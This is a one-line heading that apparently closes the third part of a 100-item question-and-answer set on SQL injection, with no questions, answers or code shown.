## END OF PART 3 - SQL INJECTION (100 Q&A COMPLETE)